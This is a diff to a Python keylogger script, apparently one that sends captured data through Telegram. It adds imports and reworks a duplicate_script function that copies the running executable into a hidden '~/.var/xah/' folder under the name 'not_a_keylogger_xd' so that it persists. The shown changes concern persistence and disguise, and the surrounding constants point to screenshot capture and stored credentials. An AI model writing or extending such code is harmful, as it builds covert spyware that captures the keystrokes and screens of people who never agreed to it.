@@ -6,10 +6,12 @@ from PIL import ImageGrab
 import re
 import requests
 import json
+import io
 import credentials
 import os
 import sys
 import shutil
+import subprocess
 
 # --------------------- CONSTANTS --------------------- #
 
@@ -23,7 +25,8 @@ IMG_FILE = 'screenshot_'
 CREDENTIAL_DIR = 'keylogger/credentials/'
 CREDENTIAL_FILE_TELEGRAM = 'credentials_telegram.json'
 
-DUPLICATE_EXE_DIR = '~/.var/xah'
+DUPLICATE_EXE_DIR = '~/.var/xah/'
+DUPLICATE_NAME_FILE = 'not_a_keylogger_xd'
 
 TIME_OUT = 60 # period in seconds to capture data
 
@@ -44,7 +47,12 @@ def duplicate_script():
     if not os.path.exists(duplicate_dir):
         os.makedirs(duplicate_dir)
 
-    shutil.copy(sys.executable, os.path.join(duplicate_dir, 'not_a_keylogger_xd'))
+    current_script = sys.executable
+
+    duplicate_script_path = os.path.join(duplicate_dir, DUPLICATE_NAME_FILE)
+
+    if not os.path.isfile(duplicate_script_path):
+        shutil.copyfile(current_script, duplicate_script_path)
 
 def write_to_log(message: str, log_name: str) -> bool:
     """
